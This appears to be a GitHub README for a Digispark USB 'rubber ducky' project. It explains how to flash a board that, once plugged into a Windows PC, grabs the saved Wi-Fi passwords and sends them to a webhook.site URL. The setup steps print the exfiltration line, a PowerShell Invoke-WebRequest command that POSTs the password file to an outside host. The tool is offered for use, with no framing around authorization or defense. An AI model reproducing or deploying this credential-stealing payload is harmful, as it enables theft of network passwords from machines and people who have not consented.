# wifi-grabber-ducky
USB rubber ducky that grabs saved wifi password from pc and sends into a webhook site. This is inspired from Cyber Mentor's [video](https://www.youtube.com/watch?v=uH-4btjE56E&t=248s).

## Requirements
 - [Digispark USB Development Board Attiny85](https://circuit.rocks/products/digispark-usb-development-board-attiny85)
 - [Arduino IDE](https://www.arduino.cc/en/software/)

## Usage
 1. Go to [Webhook Site](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://webhook.site/&ved=2ahUKEwiK_6b4y5GFAxURyzgGHd0CDaAQFnoECAcQAQ&usg=AOvVaw1m2b3mmqgLIDfWa5YwqIcy).
 2. Copy your *unique URL*.
    
    ![image](https://github.com/meezlung/wifi-grabber-ducky/assets/65329581/ed3473b1-9af0-492e-96c8-1e8847e36edd)
    
 3. Download *wifi-key-grab.ino* file and edit it using Arduino IDE.
 4. In line 42 or in the line of code below, change the webhook url to your unique URL.
  ```
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/2265df61-338c-470f-a0ec-0f6011dc9a16 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  ```
 5. Once set, compile your program in Arduino IDE.
 6. Plug in your DigiSpark USB, then upload the program.
 7. Enjoy.

## Demo
![wifi-key-grabber-demo](https://github.com/meezlung/wifi-grabber-ducky/assets/65329581/26b95e26-6afd-4644-bdf3-ad73d0abc26b)

## Note:
If ever you're going to use it again, make sure to repeat the steps again, as webhook URLs tend to reset after some time.
